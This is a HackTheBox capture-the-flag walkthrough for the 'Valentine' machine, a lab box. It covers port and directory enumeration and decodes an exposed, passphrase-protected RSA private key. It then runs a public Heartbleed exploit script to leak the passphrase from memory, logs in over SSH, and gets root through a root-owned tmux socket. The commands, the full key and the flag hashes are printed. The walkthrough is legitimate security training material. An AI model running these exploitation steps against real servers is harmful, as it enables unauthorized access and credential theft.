---
layout: post
title: Hackthebox Valentine Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-04-18/valentine.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Valentine`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.79 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 15:20 EEST
Nmap scan report for 10.10.10.79
Host is up (0.044s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-04-12T12:25:15+00:00; +4m06s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 4m05s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.65 seconds
```

### Adding entry to `/etc/hosts`
```shell
root@kali:~# cat /etc/hosts | grep valentine
10.10.10.79 valentine.htb
```

### Gobuster HTTP:
```shell
root@kali:~# gobuster dir -u http://10.10.10.79 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.79
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/12 15:28:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/cgi-bin/ (Status: 403)
/decode (Status: 200)
/decode.php (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/index.php (Status: 200)
/index (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/12 15:29:05 Finished
===============================================================
```

### Gobuster HTTPS:
```shell
root@kali:~# gobuster dir -u https://valentine.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://valentine.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/12 15:30:16 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/cgi-bin/ (Status: 403)
/decode (Status: 200)
/decode.php (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/index (Status: 200)
/index.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/12 15:30:56 Finished
===============================================================
```

## 2. Getting User
We have file listing at `http://10.10.10.79/dev`.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-04-18/2020-04-17-23-09-39.png)

At `http://10.10.10.79/dev/hype_key`, we can find hex characters.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-04-18/2020-04-17-23-07-19.png)

We can decode the hex characters with the following command.<br>
It is an RSA private key.
```shell
root@kali:~# curl http://10.10.10.79/dev/hype_key -s | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Try to log in with the SSH key.<br>
However, we get password prompt.
```shell
root@kali:~# curl http://10.10.10.79/dev/hype_key -s | xxd -r -p > hype_key

root@kali:~# chmod 600 hype_key

root@kali:~# ssh -i hype_key hype@10.10.10.79
Enter passphrase for key 'hype_key':
```

On the top page, we have an image an woman with `bleeding heart`.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-04-18/omg.jpg)

Then, try to check if this has <a href="https://heartbleed.com/">Heartbleed</a>.<br>
We can confirm that this server is vulnerable to the `Heartbleed` affects some old versions of `OpenSSL`.
```shell
root@kali:~# nmap -p 443 --script ssl-heartbleed valentine.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 15:42 EEST
Nmap scan report for valentine.htb (10.10.10.79)
Host is up (0.042s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      http://cvedetails.com/cve/2014-0160/

Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```

Then, try `searchsploit`.
```shell
root@kali:~# searchsploit heartbleed
-------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                          |  Path
                                                                                                        | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------- ----------------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)     | exploits/multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                     | exploits/multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                      | exploits/multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                        | exploits/multiple/remote/32745.py
-------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

This time, <a href="https://www.exploit-db.com/exploits/32764">OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure</a> has been used.<br>
Running several times, we can get an interesting parameter `$text=`.
```shell
root@kali:~# python 32764.py 10.10.10.79
Trying SSL 3.0...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0300, length = 94
 ... received message: type = 22, ver = 0300, length = 885
 ... received message: type = 22, ver = 0300, length = 331
 ... received message: type = 22, ver = 0300, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0300, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C 009 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  i
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 19  mV0aGVoeXBlCg==.
  0160: DB DA 04 9F 88 9D 1A 08 49 22 66 0D F7 3C 50 59  ........I"f..<PY
  0170: BE 7E 12 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .~..............

---

```

Decode the base64 text.
```shell
root@kali:~# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```
Using the ssh key and key passphrase found in the previous step, we can log in to the `Valentine` as an user `hype`.
```shell
root@kali:~# ssh -i hype_key hype@10.10.10.79
Enter passphrase for key 'hype_key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
```

`user.txt` is in a directory `/home/hype/Desktop`.
```shell
hype@Valentine:~$ cat Desktop/user.txt 
e6710a5464769fd5fcd216e076961750
```


## 3. Getting Root
In `.bash_history`, we have some command histories.<br>
`tmux` has been executed several times and we can find a session file `/.devs/dev_sess` was attached.
```shell
hype@Valentine:~$ cat .bash_history

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

Take a look at `/.devs/dev_sess`. We can confirm that this is owned by `root` and SUID bit is set.
```shell
hype@Valentine:/.devs$ ls -l
total 0
srw-rw---- 1 root hype 0 Apr 17 12:58 dev_sess
```

Attach the tmux session with this command.<br>
We can achieve a root shell. As always, `root.txt` is in the directory `/root`.
```shell
hype@Valentine:/.devs$ tmux -S /.devs/dev_sess
```
```shell
root@Valentine:/.devs# id
uid=0(root) gid=0(root) groups=0(root)

root@Valentine:/.devs# cat /root/root.txt 
f1bb6d759df1f272914ebbc9ed7765b2
```
